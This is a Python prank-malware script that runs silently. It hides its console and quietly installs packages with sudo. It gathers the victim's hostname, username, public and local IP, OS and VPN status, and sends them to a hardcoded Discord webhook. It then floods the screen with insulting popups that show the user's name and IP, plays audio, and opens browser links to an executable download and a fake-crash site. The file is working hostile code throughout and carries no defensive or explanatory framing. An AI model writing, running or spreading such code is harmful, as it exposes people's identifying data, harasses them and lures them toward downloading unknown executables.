#!/usr/bin/env python3
import sys
import os
import subprocess
import importlib.util
import random
import colorsys
import socket
import getpass
import platform
import json
import time

# Hide console output on Windows
if sys.platform == 'win32':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ====================== SILENT DEPENDENCY INSTALLATION ======================
def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def ensure_dependencies():
    required = {
        'requests': 'requests',
        'pygame': 'pygame',
        'tkinter': 'python3-tk' if sys.platform == 'linux' else 'tkinter'
    }

    if sys.platform == 'linux':
        try:
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'python3-tk'],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          check=True)
        except:
            pass

    for module, package in required.items():
        if not importlib.util.find_spec(module):
            install_package(package)

ensure_dependencies()

# ====================== SILENT IMPORTS ======================
try:
    import requests
    import pygame
    import tkinter as tk
    from tkinter import messagebox
except:
    sys.exit(0)

# ====================== CONFIGURATION ======================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1406740056445550612/FXfhW-u73XRy6vk1qBwg8ZkUtvONWBYz8rx7FKmWTXZWTRqjgiHQvFYkBALt2u19JS5r"
AUDIO_FILE = "YOU ARE A SKID.mp3"

# ====================== CONSTANTS ======================
MAX_WINDOWS = 5000
SPAWN_INTERVAL_MS = 1500
MOVE_INTERVAL_MS = 500
COLOR_UPDATE_INTERVAL_MS = 30

windows = [5]
running = True
spawn_count = 0
sound_playing = False

# ====================== SILENT SYSTEM INFO ======================
def get_public_ip():
    services = [
        'https://api.ipify.org',
        'https://ident.me',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/json'
    ]
    
    for service in services:
        try:
            response = requests.get(service, timeout=5)
            if response.status_code == 200:
                if service.endswith('json'):
                    ip = response.json().get('ip', '').strip()
                else:
                    ip = response.text.strip()
                if ip and ip.count('.') == 3:
                    return ip
        except:
            continue
    return "Unknown"

def get_system_info():
    username = getpass.getuser()
    public_ip = get_public_ip()
    local_ip = socket.gethostbyname(socket.gethostname())
    
    try:
        privacy_status = "No Privacy Tools Detected"
        response = requests.get(f'https://ipinfo.io/{public_ip}/json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            org = data.get('org', '').lower()
            if any(x in org for x in ['vpn', 'proxy', 'tor', 'hosting']):
                privacy_status = "VPN/Proxy Detected"
    except:
        privacy_status = "Unknown"
    
    return {
        'hostname': socket.gethostname(),
        'username': username,
        'public_ip': public_ip,
        'local_ip': local_ip,
        'privacy_status': privacy_status,
        'os': f"{platform.system()} {platform.release()}",
        'messages': [
            f"{username.upper()} IS A IDIOT",
            public_ip
        ]
    }

# ====================== SILENT DISCORD REPORTING ======================
def send_to_discord():
    try:
        info = get_system_info()
        embed = {
            "title": "📜 System Information",
            "color": 0x3498db,
            "fields": [
                {"name": "💻 Hostname", "value": f"```{info['hostname']}```", "inline": True},
                {"name": "👤 Username", "value": f"```{info['username']}```", "inline": True},
                {"name": "🌐 Public IP", "value": f"```{info['public_ip']}```", "inline": True},
                {"name": "🏠 Local IP", "value": f"```{info['local_ip']}```", "inline": True},
                {"name": "🔒 Privacy Status", "value": f"```{info['privacy_status']}```", "inline": True},
                {"name": "🖥️ OS", "value": f"```{info['os']}```", "inline": True}
            ]
        }
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except:
        pass

# ====================== SILENT AUDIO ======================
def setup_audio():
    try:
        pygame.mixer.init()
        script_dir = os.path.dirname(os.path.abspath(__file__))
        audio_path = os.path.join(script_dir, AUDIO_FILE)
        if os.path.exists(audio_path):
            return pygame.mixer.Sound(audio_path)
    except:
        pass
    return None

def play_sound(sound):
    global sound_playing
    if not sound_playing and sound:
        try:
            sound_playing = True
            sound.play()
            pygame.time.set_timer(pygame.USEREVENT, int(sound.get_length() * 1000))
        except:
            sound_playing = False

# ====================== SILENT GUI ======================
def create_popup(root, message):
    try:
        win = tk.Toplevel(root)
        win.overrideredirect(True)
        win.attributes('-topmost', True)
        win.configure(bg='black')
        
        shadow = tk.Label(win, text=message, font=("Arial", 16, "bold"), 
                         fg="gray20", bg="black")
        shadow.place(x=2, y=2)
        
        label = tk.Label(win, text=message, font=("Arial", 16, "bold"), 
                       fg="red", bg="black", name="main_label")
        label.pack()
        
        return win
    except:
        return None

def update_text_color(label, hue=0.0):
    if not running or not label.winfo_exists():
        return
    r, g, b = colorsys.hsv_to_rgb(hue, 1, 1)
    label.config(fg=f'#{int(r*255):02x}{int(g*255):02x}{int(b*255):02x}')
    label.after(COLOR_UPDATE_INTERVAL_MS, lambda: update_text_color(label, (hue + 0.01) % 1.0))

def move_window(win):
    if not running or not win.winfo_exists():
        return
    try:
        screen_width = win.winfo_screenwidth()
        screen_height = win.winfo_screenheight()
        win.geometry(f"+{random.randint(0, screen_width-250)}+{random.randint(0, screen_height-80)}")
        win.after(MOVE_INTERVAL_MS, lambda: move_window(win))
    except:
        pass

def spawn_window(root, sound, messages):
    global spawn_count, sound_playing
    
    if not running or len(windows) >= MAX_WINDOWS:
        return
    
    message = messages[spawn_count % len(messages)]
    win = create_popup(root, message)
    
    if win:
        windows.append(win)
        play_sound(sound)
        
        label = win.children['main_label']
        update_text_color(label)
        move_window(win)
    
    spawn_count += 1
    root.after(SPAWN_INTERVAL_MS, lambda: spawn_window(root, sound, messages))

def close_all():
    global running
    running = False
    for win in windows:
        try:
            win.destroy()
        except:
            pass
    windows.clear()
    try:
        pygame.mixer.quit()
    except:
        pass

# ====================== MAIN (SILENT) ======================
def main():
    # Setup sound finished event
    def on_sound_finished(event):
        global sound_playing
        if event.type == pygame.USEREVENT:
            sound_playing = False
    
    pygame.init()
    pygame.event.set_allowed(pygame.USEREVENT)
    
    send_to_discord()
    sound = setup_audio()
    
    root = tk.Tk()
    root.withdraw()
    root.protocol("WM_DELETE_WINDOW", close_all)
    root.bind("<Escape>", lambda e: close_all())
    
    spawn_window(root, sound, get_system_info()['messages'])
    import webbrowser                                                                    
    webbrowser.open('https://download1655.mediafire.com/02p6cvkjet7giHdWbaDivHsU6UH5HZrtQ_6jIacQzPOIeTP3ci2Y769rhb8N69hkglHVWQKCaWcAoHMGLUHEaxbqdLqewc-euy_1GUqshqooGakve2N8CN4zrEHGjQ7HOrBaSiQy1Baxgi4eYerW4iUVYF-0A_Ukmzu_BTAtnROk5E8/yrh6466dk9btysk/desktop-goose-0-3.exe/')           
    webbrowser.open('https://bsodmaker.net/')
    try:
        while running:
            for event in pygame.event.get():
                if event.type == pygame.USEREVENT:
                    on_sound_finished(event)
            root.update()
    except:
        close_all()

if __name__ == "__main__":
    main()